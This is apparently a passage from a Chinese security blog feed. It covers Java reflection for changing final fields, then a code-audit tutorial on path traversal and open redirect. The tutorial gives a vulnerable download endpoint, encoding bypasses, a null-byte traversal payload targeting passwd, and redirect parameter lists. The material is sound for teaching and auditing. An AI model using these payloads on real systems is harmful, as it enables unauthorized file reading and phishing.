id="间接赋值"><a href="#间接赋值" class="headerlink" title="间接赋值"></a>间接赋值</h4><p><strong>InDirectPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InDirectPerson</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;male&quot;</span>);  <br>    <span class="hljs-comment">// 经过逻辑判断产生的变量赋值  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> (<span class="hljs-literal">null</span>!=<span class="hljs-literal">null</span>?<span class="hljs-number">18</span>:<span class="hljs-number">18</span>);  <br>    <span class="hljs-comment">// 通过构造函数进行赋值  </span><br> <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String name;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InDirectPerson</span><span class="hljs-params">()</span>&#123;  <br>        name = <span class="hljs-string">&quot;1&quot;</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name+<span class="hljs-string">&quot; &quot;</span>+age+<span class="hljs-string">&quot; &quot;</span>+sex);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>InDirectReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InDirectReflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.InDirectPerson&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);<br>        printMethod.invoke(m);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">ageField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;age&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">sexField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;sex&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        ageField.setAccessible(<span class="hljs-literal">true</span>);<br>        sexField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(m,<span class="hljs-string">&quot;2&quot;</span>);<br>        ageField.set(m,<span class="hljs-number">180</span>);<br>        sexField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;female&quot;</span>));<br>        printMethod.invoke(m);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功修改</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a06.png"></p><h3 id="static-final"><a href="#static-final" class="headerlink" title="static + final"></a>static + final</h3><p>使用 static final 修饰符的 name 属性，并且是间接赋值，直接通过反射修改是不可以的。</p><p>如果 <code>final</code> 字段是 <strong>编译期常量</strong>（<code>static final</code> 并且是基本类型或 String 且值已知），编译器会直接把值<strong>内联</strong>到使用它的地方。<br> 即使你用反射改了字段值，原来引用它的地方读的仍然是编译期替换进去的值。</p><p>这里我们需要通过反射, 把 nameField 的 final 修饰符去掉，再赋值。</p><p><strong>StaticFinalPerson.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticFinalPerson</span> &#123;  <br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;1&quot;</span>);  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printInfo</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(name);  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>StaticFinalReflect.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticFinalReflect</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;src.ReflectDemo.ReflectFixFinal.pojo.StaticFinalPerson&quot;</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c.newInstance();  <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">printMethod</span> <span class="hljs-operator">=</span> c.getDeclaredMethod(<span class="hljs-string">&quot;printInfo&quot;</span>);  <br>        printMethod.invoke(m);  <br>  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);  <br>        nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameModifyField</span> <span class="hljs-operator">=</span> nameField.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);  <br>        nameModifyField.setAccessible(<span class="hljs-literal">true</span>);  <br>        nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);  <br>        nameField.set(m,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;2&quot;</span>));  <br>        nameModifyField.setInt(nameField, nameField.getModifiers() &amp; ~Modifier.FINAL);  <br>        printMethod.invoke(m);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a07.png"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的其他漏洞</title>
    <link href="/2025/08/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/08/11/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="java代码审计中的其他漏洞"><a href="#java代码审计中的其他漏洞" class="headerlink" title="java代码审计中的其他漏洞"></a>java代码审计中的其他漏洞</h1><h2 id="目录穿越漏洞-任意文件下载-读取"><a href="#目录穿越漏洞-任意文件下载-读取" class="headerlink" title="目录穿越漏洞(任意文件下载&#x2F;读取)"></a>目录穿越漏洞(任意文件下载&#x2F;读取)</h2><p>出自：<a href="https://www.cnblogs.com/chm0d/p/17664249.html">Java代码审计之目录穿越(任意文件下载&#x2F;读取) - chm0d的安全避风港 - 博客园</a></p><p>此漏洞一般配合文件操作进行使用</p><h3 id="什么是目录穿越"><a href="#什么是目录穿越" class="headerlink" title="什么是目录穿越"></a>什么是目录穿越</h3><p>　　所谓的目录穿越指利用操作系统中的文件系统对目录的表示。在文件系统路径中，”..”表示上一级目录，当你使用”..&#x2F;“时，你正在引用当前目录的上一级目录。如果你使用”..&#x2F;..&#x2F;“，你实际上在两次”..”的基础上，再次引用上一级目录，从而返回到上两级目录。</p><p>　　例子：假设你目前所在目录为：C:\Windows\System32\drivers\etc</p><ul><li>使用”..&#x2F;“ 一次返回上一级目录，即：C:\Windows\System32\drivers</li><li>使用”..&#x2F;..&#x2F;“ 一次返回上一级目录，即：C:\Windows\System32</li></ul><p>　　这是因为在文件系统路径中，每个”..”都表示回到上一级目录。所以多个连续的”..”会连续返回到更高级别的目录。然而在漏洞利用中Windows和Linux系统会有区别，后续漏洞利用中会提到。</p><h3 id="目录穿越漏洞成因"><a href="#目录穿越漏洞成因" class="headerlink" title="目录穿越漏洞成因"></a>目录穿越漏洞成因</h3><p>　　目录穿越漏洞，也叫做目录遍历&#x2F;路径遍历漏洞。常发生于文件上传，文件下载，文件下载等处。由于后端直接接收前端传过来的文件名或路径，没有对其进行检测与过滤，导致攻击者利用..&#x2F;的方式进行目录穿越，达到任意文件读取&#x2F;下载，任意文件删除，或将任意文件上传到指定目录等。</p><h3 id="目录穿越漏洞的利用"><a href="#目录穿越漏洞的利用" class="headerlink" title="目录穿越漏洞的利用"></a>目录穿越漏洞的利用</h3><p>　　Windows中目录穿越漏洞由于操作系统可能导致只能在设定好的盘符下进行穿越，不能越过其他盘符读取，如：读取日志文件，后端代码F:&#x2F;wwwroot&#x2F;logs + “前端传递的文件名”。此时通过..&#x2F;进行目录穿越只能在F盘下进行读取，不能读取F盘以外的任何文件，如：C:\windows\win.ini。而Linux中却不受到这种限制，只要有足够的权限可以读任意目录下的文件。</p><p>　　一般目录穿越导致的主要为任意文件读取，一般都是读取配置文件，因为配置文件中保存着大量敏感信息，如：各种数据库连接地址与账号密码</p><h3 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//    任意文件读取/下载</span><br>    <span class="hljs-meta">@ApiOperation(value = &quot;任意文件读取/下载&quot;)</span><br>    <span class="hljs-meta">@GetMapping(&quot;readBuffer&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">readbuffer</span><span class="hljs-params">(String filename,HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(Files.newInputStream(Paths.get(filename))))&#123;<br>            response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=&quot;</span> + filename);<br>            response.setContentLength((<span class="hljs-type">int</span>) Files.size(Paths.get(filename)));<br>            response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br><br>            <span class="hljs-comment">// 使用 Apache Commons IO 库的工具方法将输入流中的数据拷贝到输出流中</span><br>            IOUtils.copy(inputStream, response.getOutputStream());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件下载成功：&quot;</span> + filename;<br>        &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;文件下载失败：&quot;</span> + filename;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>此处就是对filename参数没有任何过滤，导致攻击者使用..&#x2F;可实现任意文件下载</p><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h4><p>单次url编码，..&#x2F;编码后..%2f，%2e%2e%2f。</p><h4 id="双-多重url编码"><a href="#双-多重url编码" class="headerlink" title="双&#x2F;多重url编码"></a>双&#x2F;多重url编码</h4><p>进行双重url编码，多了个25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">. = %252e<br>/ = %252f<br>\ = %255c<br></code></pre></td></tr></table></figure><h4 id="Unicode的URL编码"><a href="#Unicode的URL编码" class="headerlink" title="Unicode的URL编码"></a>Unicode的URL编码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">. = %u002e<br>/ = %u2215<br>\ = %u2216<br></code></pre></td></tr></table></figure><h4 id="UTF-8的Unicode编码"><a href="#UTF-8的Unicode编码" class="headerlink" title="UTF-8的Unicode编码"></a>UTF-8的Unicode编码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">. = %c0%2e, %e0%40%ae, %c0ae<br>/ = %c0%af, %e0%80%af, %c0%2f<br>\ = %c0%5c, %c0%80%5c<br></code></pre></td></tr></table></figure><h4 id="超长UTF-8编码"><a href="#超长UTF-8编码" class="headerlink" title="超长UTF-8编码"></a>超长UTF-8编码</h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">. <span class="hljs-operator">=</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%2</span>e<span class="hljs-punctuation">,</span> <span class="hljs-variable">%e0</span><span class="hljs-variable">%40</span><span class="hljs-variable">%ae</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%c0ae</span><br>/ <span class="hljs-operator">=</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%af</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%af</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%2</span>f<br>\ <span class="hljs-operator">=</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><h4 id="空字节截断"><a href="#空字节截断" class="headerlink" title="空字节截断"></a>空字节截断</h4><p>也就是大家熟知的00截断，用于判断后缀名，使用空字节URL编码绕过（出现几率非常小）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../passwd%<span class="hljs-number">00</span>.jpg<br></code></pre></td></tr></table></figure><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>通过前面原理介绍，目录穿越是由于文件系统的特性所导致的，通过..&#x2F;进行目录的跨越。修复只需要检测字符”..”与”&#x2F;“即可，在对应语言中加入检测即可，以java为例：写一个工具类检测即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Security</span> &#123;<br><br><span class="hljs-comment">//    目录穿越检验</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkTraversal</span><span class="hljs-params">(String content)</span>&#123;<br>        <span class="hljs-keyword">return</span> content.contains(<span class="hljs-string">&quot;..&quot;</span>) || content.contains(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="url重定向"><a href="#url重定向" class="headerlink" title="url重定向"></a>url重定向</h2><p>参考：《网络安全Java代码审计实战》</p><p>​<a href="https://xz.aliyun.com/news/14506">记URL重定向漏洞骚技巧-先知社区</a></p><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>也称URL跳转、URL重定向漏洞，由于目标网站未对程序跳转的URL地址及参数做合法性判断，导致应用程序直接跳转到参数中指定的的URL地址。攻击者可通过将跳转地址修改为指向恶意站点，即可发起网络钓鱼、诈骗甚至窃取用户凭证等。</p><h3 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h3><h4 id="1-通过-ModelAndView-方式"><a href="#1-通过-ModelAndView-方式" class="headerlink" title="1.通过 ModelAndView 方式"></a>1.通过 ModelAndView 方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">testforward</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> Exception &#123; <br> <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span>req.getParameter(<span class="hljs-string">&quot;url&quot;</span>); <br> <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;redirect: &quot;</span>+url; <br> <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(url); <br>&#125;<br></code></pre></td></tr></table></figure><p>URL 跳转使用方式：<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.com。</a></p><h4 id="2-通过返回-String-方式"><a href="#2-通过返回-String-方式" class="headerlink" title="2.通过返回 String 方式"></a>2.通过返回 String 方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url; <br> &#125;<br></code></pre></td></tr></table></figure><p>URL 跳转使用方式：<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.com。</a></p><h4 id="3-使用-sendRedirect-方式"><a href="#3-使用-sendRedirect-方式" class="headerlink" title="3.使用 sendRedirect 方式"></a>3.使用 sendRedirect 方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendRedirect</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> <br>IOException&#123; <br> <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>); <br> response.sendRedirect(url); <br>&#125;<br></code></pre></td></tr></table></figure><p>URL 跳转使用方式：<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.com。</a>  </p><h4 id="4-使用-RedirectAttributes-方式"><a href="#4-使用-RedirectAttributes-方式" class="headerlink" title="4.使用 RedirectAttributes 方式"></a>4.使用 RedirectAttributes 方式</h4><p>对于一般的 URL 跳转，使用 redirect 即可满足要求。如果需要进行参数拼接，则一 般使用 RedirectAttributes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/RedirectAttributes&quot;)</span> <br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">test4</span><span class="hljs-params">(RedirectAttributes redirectAttributes)</span> &#123; <br> redirectAttributes.addAttribute(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>); <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/test/index&quot;</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>URL 跳转使用方式：<a href="http://www.any.com/RedirectAttributes%E3%80%82">http://www.any.com/RedirectAttributes。</a>  “ @RequestMapping(“&#x2F;RedirectAttributes”) ” 在 方 法 前 面 要 说 明 URL 访 问 是 通 过 <a href="http://192.168.88.2:8080/RedirectAttributes">http://192.168.88.2:8080/RedirectAttributes</a> 来访问的，代码中“return “redirect:&#x2F;test&#x2F;index”;”， 就 会 重 定 向 到 <a href="http://192.168.88.2:8080/test/index">http://192.168.88.2:8080/test/index</a> 这 个 URL ， 通 过 “ redirectAttributes.  addAttribute(“id”,”2”)”传递了 id&#x3D;2 这个参数，所以最终访问的其实是 <a href="http://192.168.88.2/">http://192.168.88.2</a>:  8080&#x2F;test&#x2F;index?id&#x3D;2 这个 URL 地址。</p><p><img src="/img/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/q01.png"></p><h4 id="5-通过设置Header来进行跳转"><a href="#5-通过设置Header来进行跳转" class="headerlink" title="5.通过设置Header来进行跳转"></a>5.通过设置Header来进行跳转</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHeader</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;     <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);     response.setStatus(HttpServletResponse.SC_MOVED_TEMPORARILY);       response.setHeader(<span class="hljs-string">&quot;Location&quot;</span>, url); &#125; <br></code></pre></td></tr></table></figure><p>通过“response.setStatus(HttpServletResponse.SC_MOVED_TEMPORARILY)”设置返回的状态码，“SC_MOVED_PERMANENTLY”是301 永久重定向，“SC_MOVED_ TEMPORARILY”是302 临时重定向。 </p><p>URL跳转使用方式：<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.com。</a></p><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><p>主要是业务逻辑中需要进行跳转的地方。比如登录处、注册处、访问用户信息、订单信息、加入购物车、分享、收藏等处。</p><ol><li>登陆跳转是最常见的跳转类型，认证完后会跳转，所以在登陆的时候建议多观察url参数</li><li>用户分享、收藏内容过后，会跳转</li><li>跨站点认证、授权后，会跳转</li><li>站内点击其它网址链接时，会跳转</li><li>在一些用户交互页面也会出现跳转，如请填写对客服评价，评价成功跳转主页，填写问卷，等等业务，注意观察url。</li><li>业务完成后跳转这可以归结为一类跳转，比如修改密码，修改完成后跳转登陆页面，绑定银行卡，绑定成功后返回银行卡充值等页面，或者说给定一个链接办理VIP，但是你需要认证身份才能访问这个业务，这个时候通常会给定一个链接，认证之后跳转到刚刚要办理VIP的页面。</li></ol><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><h4 id="url跳转常用参数"><a href="#url跳转常用参数" class="headerlink" title="url跳转常用参数"></a>url跳转常用参数</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">redirect<br>url<br>redirectUrl<br>callback<br>return_url<br>toUrl<br>ReturnUrl<br>fromUrl<br>redUrl<br>request<br>redirect_to<br>redirect_url<br>jump<br>jump_to<br>target<br>to<br><span class="hljs-keyword">goto</span><br>link<br>linkto<br>domain<br>oauth_callback<br></code></pre></td></tr></table></figure><h4 id="实现url跳转需要的方法"><a href="#实现url跳转需要的方法" class="headerlink" title="实现url跳转需要的方法"></a>实现url跳转需要的方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">redirect <br>sendRedirect<br>ModelAndView<br>Location<br>addAttribute … <br></code></pre></td></tr></table></figure><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol><li><p>攻击者可能会使用Web服务器攻击其他站点；</p></li><li><p>如果对输出没有做严格限制，将可能导致反射性XSS漏洞；</p></li><li><p>黑产将利用此漏洞，从信任网站跳转到攻击者构造的恶意网站用来进行钓鱼、诈骗等行为；</p></li><li><p>结合csrf漏洞，攻击者可通过url重定向获取cookie</p><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">CSRF漏洞原理攻击与防御（非常细）-CSDN博客</a></p></li></ol><h3 id="实战案例-黑盒"><a href="#实战案例-黑盒" class="headerlink" title="实战案例(黑盒)"></a>实战案例(黑盒)</h3><p>出自：(<a href="https://xz.aliyun.com/news/14506">https://xz.aliyun.com/news/14506</a>)</p><p>该漏洞场景是对一个视频分享它会生成一个二维码跳转到我们要分享的视频，可我们可以在生成二维码的时候进行抓包导致ur跳转漏洞。</p><ol><li>首先我这里给分享视频地址生成的二维码</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240718133335-46e35650-44c7-1.png"></p><p>这个分享二维码的url如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">www.xxx.xxx.com/aiis/h5/pc-client/#/qrcode?url=https%3A%2F%2Fn.com%2Faiis%2FinvestmentAdvisor<br></code></pre></td></tr></table></figure><ol start="2"><li>修改该地址为 <a href="https://www.baidu.com/">https://www.baidu.com</a> 修改完成后，刷新该界面</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240718133729-d2eb1be2-44c7-1.png"></p><ol start="3"><li>然后就直接使用我们的手机扫描二维码，直接跳转到修改的地址</li></ol><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240718135621-753f023a-44ca-1.png"></p><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
